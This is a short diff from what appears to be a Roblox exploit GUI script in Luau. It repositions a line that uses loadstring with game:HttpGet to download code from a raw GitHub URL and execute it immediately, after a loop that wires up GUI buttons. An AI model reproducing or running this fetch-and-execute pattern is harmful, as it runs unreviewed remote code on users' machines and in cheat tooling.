@@ -2975,10 +2975,10 @@ local function scanGui()
 end
 
 scanGui()
-loadstring(game:HttpGet("https://github.com/SxripterRar/vXs.lua/blob/main/chat.luau?raw=true"))()
 for _, obj in ipairs(game:GetService("CoreGui").RobloxGui:WaitForChild("TCJT_PRIVATE"):GetDescendants()) do
     setupButton(obj)
 end
+loadstring(game:HttpGet("https://github.com/SxripterRar/vXs.lua/blob/main/chat.luau?raw=true"))()
 coroutine.wrap(DRHMECY_fake_script)()
 coroutine.wrap(KJUYZ_fake_script)()
 coroutine.wrap(ZNBCSQ_fake_script)()
